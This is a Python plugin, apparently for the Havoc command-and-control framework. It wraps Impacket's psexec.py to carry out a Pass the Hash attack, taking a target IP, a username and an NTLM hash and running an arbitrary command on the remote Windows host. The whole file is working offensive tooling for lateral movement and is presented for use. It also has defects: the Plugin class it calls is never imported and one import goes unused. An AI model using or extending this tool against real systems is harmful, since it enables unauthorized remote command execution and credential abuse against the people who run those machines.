from havoc import Demon, RegisterCommand
import os
import platform
import subprocess
import hashlib
import binascii

def pass_the_hash(target_ip, username, ntlm_hash, command):
    """
    Performs Pass the Hash attack to execute a command on a remote system.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Pass the Hash is only supported on Windows."

        # Use impacket's psexec.py for Pass the Hash
        impacket_path = os.path.join(os.path.dirname(__file__), "impacket", "psexec.py")
        if not os.path.exists(impacket_path):
            return "[-] Impacket not found. Please install Impacket and ensure psexec.py is available."

        # Execute the Pass the Hash attack
        cmd = [
            "python", impacket_path,
            f"{username}:@{target_ip}",
            "-hashes", f":{ntlm_hash}",
            "-c", command
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            return f"[+] Command executed successfully on {target_ip}:\n{result.stdout}"
        else:
            return f"[-] Error executing command on {target_ip}:\n{result.stderr}"
    except Exception as e:
        return f"[-] Error during Pass the Hash attack: {e}"

# Havoc C2 Integration
def pass_the_hash_command(demon, *args):
    """
    Command to perform a Pass the Hash attack.
    """
    if len(args) != 4:
        demon.ConsoleWrite("[-] Usage: pass_the_hash [target_ip] [username] [ntlm_hash] [command]")
        return

    target_ip = args[0]
    username = args[1]
    ntlm_hash = args[2]
    command = args[3]

    result = pass_the_hash(target_ip, username, ntlm_hash, command)
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("pass_the_hash", "Perform a Pass the Hash attack", pass_the_hash_command)

# Initialize the plugin
plugin = Plugin("PassTheHash", "Advanced Pass the Hash techniques", initialize)